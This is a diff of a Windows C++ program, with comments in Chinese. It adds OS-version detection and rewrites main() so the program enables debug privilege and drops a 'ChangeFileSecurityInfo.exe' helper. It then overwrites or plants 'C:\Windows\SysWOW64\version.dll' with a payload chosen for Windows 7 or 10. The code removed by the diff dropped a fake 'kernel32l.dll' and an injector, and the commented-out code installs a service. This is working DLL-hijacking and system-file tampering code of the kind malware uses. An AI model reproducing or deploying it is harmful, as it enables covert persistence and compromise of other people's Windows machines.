@@ -8,6 +8,8 @@
 #pragma comment(lib, "UserEnv.lib")
 #pragma comment(lib, "WtsApi32.lib")
 
+#include "../../publicstruct.h"
+#include "../../ClassManger/CNativeApi/CNativeApiManger.h"
 #include "../../ProcessManger/ProcessIterator/CProcessOpt.h"
 
 using namespace std;
@@ -17,11 +19,176 @@ using namespace std;
 #define  STRING string;
 #endif //  UNICODE
 
+
+#ifdef _WIN64
+#pragma comment(lib,"../../PulicLib/x64/Release/CNativeApi.lib")
+#pragma comment(lib,"../../PulicLib/x64/Release/ProcessIterator.lib")
+#pragma comment(lib,"../../PulicLib/x64/Release/RegManger.lib")
+#pragma comment(lib,"../../PulicLib/x64/Release/CFileManger.lib")
+#pragma comment(lib,"../../PulicLib/x64/Release/RemoteThread.lib")
+#else
+#pragma comment(lib,"../../PulicLib/Win32/Release/CNativeApi.lib")
+#pragma comment(lib,"../../PulicLib/Win32/Release/ProcessIterator.lib")
+#pragma comment(lib,"../../PulicLib/Win32/Release/RegManger.lib")
+#pragma comment(lib,"../../PulicLib/Win32/Release/CFileManger.lib")
+#pragma comment(lib,"../../PulicLib/Win32/Release/RemoteThread.lib")
+#endif
+
 BOOL WriteFile64AnCreateProcess(DWORD Type, STRING StartUpFileName);
 BOOL WriteFile86AnCreateProcess(DWORD Type, STRING StartUpFileName);
 
 
 BOOL ReleaseFile(DWORD Type);
+DWORD getSystemName();  //获取系统版本 返回 10 是win10 返回61 是win7
+
+DWORD getSystemName()
+{
+    std::string vname;
+    //先判断是否为win8.1或win10
+    typedef void(__stdcall*NTPROC)(DWORD*, DWORD*, DWORD*);
+    HINSTANCE hinst = LoadLibrary(TEXT("ntdll.dll"));
+    DWORD dwMajor, dwMinor, dwBuildNumber;
+    NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
+    proc(&dwMajor, &dwMinor, &dwBuildNumber);
+    if (dwMajor == 6 && dwMinor == 3)	//win 8.1
+    {
+        vname = "Microsoft Windows 8.1";
+        return 81;
+
+    }
+    if (dwMajor == 10 && dwMinor == 0)	//win 10
+    {
+        vname = "Microsoft Windows 10";
+
+        return 10;
+    }
+    //下面判断不能Win Server，因为本人还未有这种系统的机子，暂时不给出
+
+
+
+    //判断win8.1以下的版本
+    SYSTEM_INFO info;                //用SYSTEM_INFO结构判断64位AMD处理器  
+    GetSystemInfo(&info);            //调用GetSystemInfo函数填充结构  
+    OSVERSIONINFOEX os;
+    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
+#pragma warning(disable:4996)
+    if (GetVersionEx((OSVERSIONINFO *)&os))
+    {
+
+        //下面根据版本信息判断操作系统名称  
+        switch (os.dwMajorVersion)
+        {                        //判断主版本号  
+        case 4:
+            switch (os.dwMinorVersion)
+            {                //判断次版本号  
+            case 0:
+                if (os.dwPlatformId == VER_PLATFORM_WIN32_NT)
+                {
+                    //vname = "Microsoft Windows NT 4.0";  //1996年7月发布  
+                    return 40;
+                }
+                else if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
+                {
+
+                    vname = "Microsoft Windows 95";
+                    return 401;
+                }
+                return 0;
+            case 10:
+                vname = "Microsoft Windows 98";
+                return 410;
+            case 90:
+                vname = "Microsoft Windows Me";
+                return 490;
+
+            }
+            return 0;
+        case 5:
+            switch (os.dwMinorVersion)
+            {               //再比较dwMinorVersion的值  
+            case 0:
+                vname = "Microsoft Windows 2000";    //1999年12月发布  
+
+                return 50;
+            case 1:
+                vname = "Microsoft Windows XP";      //2001年8月发布  
+                return 51;
+
+            case 2:
+                if (os.wProductType == VER_NT_WORKSTATION &&
+                    info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
+                {
+                    vname = "Microsoft Windows XP Professional x64 Edition";
+                    return 52;
+                }
+                else if (GetSystemMetrics(SM_SERVERR2) == 0)
+                {
+                    vname = "Microsoft Windows Server 2003";   //2003年3月发布  
+                    return 521;
+                }
+                else if (GetSystemMetrics(SM_SERVERR2) != 0)
+                {
+                    vname = "Microsoft Windows Server 2003 R2";
+                    return 522;
+                }
+                return 0;
+            }
+            return 0;
+        case 6:
+            switch (os.dwMinorVersion)
+            {
+            case 0:
+                if (os.wProductType == VER_NT_WORKSTATION)
+                {
+                    vname = "Microsoft Windows Vista";
+                    return 60;
+                }
+                else
+                {
+                    vname = "Microsoft Windows Server 2008";   //服务器版本  
+                    return 62008;
+                }
+                return 0;
+            case 1:
+                if (os.wProductType == VER_NT_WORKSTATION)
+                {
+                    vname = "Microsoft Windows 7";
+                    return 61;
+                }
+                else
+                {
+                    vname = "Microsoft Windows Server 2008 R2";
+                    return 612;
+                }
+                break;
+            case 2:
+                if (os.wProductType == VER_NT_WORKSTATION)
+                {
+                    vname = "Microsoft Windows 8";
+                    return 62;
+                }
+                else
+                {
+                    vname = "Microsoft Windows Server 2012";
+                    return 62012;
+                }
+                return 0;
+            }
+            return 0;
+        default:
+        {
+            vname = "未知操作系统";
+            return 0;
+        }
+        }
+        //printf_s("此电脑的版本为:%s\n", vname.c_str());
+        return 0;
+    }
+    else
+
+        return  0;
+}
+
 BOOL NoSeccionCreateProcess(CBinString lpszFileName)
 {
     BOOL bRet = TRUE;
@@ -332,21 +499,32 @@ int main()
     CProcessOpt PsOpt;
     PsOpt.SeEnbalAdjustPrivileges(SE_DEBUG_NAME);
 
-
+    DWORD dwWinver = getSystemName(); //判断系统版本
  
     CBinString patchName = TEXT("");
     patchName = GetPath();
-    patchName.append(TEXT("kernel32l.dll"));//寫入DLL
-    ReleaseFile(KILL_LOCKDLL, patchName);
-    
-  
-
-    Sleep(1000);
-    patchName = GetPath();
-    patchName.append(TEXT("i.exe"));
+    patchName.append(TEXT("ChangeFileSecurityInfo.exe"));//寫入DLL
+    WriteFile86AnCreateProcess(CHANGE_FILESECURRTY_WIN7, patchName);
+    Sleep(300);
     //WriteFile86AnCreateProcess(INJECT_KILL_IELOCKLOADER, patchName); //写注入器
-    ReleaseFile(INJECT_KILL_IELOCKLOADER, patchName);
-    NoSeccionCreateProcess(patchName);
+    if (dwWinver == 61)
+    {
+        //win7
+        patchName = TEXT("C:\\Windows\\SysWOW64\\version.dll");
+        ReleaseFile(VERSION_WIN7_SP1, patchName);
+        Sleep(300);
+        return 0;
+    }
+    else if (dwWinver == 10)
+    {
+        patchName = TEXT("C:\\Windows\\SysWOW64\\version.dll");
+        ReleaseFile(VERSION_WIN10, patchName);
+        Sleep(300);
+        return 0;
+    }
+   
+    return 0;
+   // NoSeccionCreateProcess(patchName);
  
     //写入SystemService
 
@@ -361,7 +539,7 @@ int main()
     //WriteFile86AnCreateProcess(CreateAnStartServices, patchName); //写注入器
     ////写入服务创建并且启动
 
-    Sleep(3000);
+  
     
     DeleteFile(patchName.c_str());
 
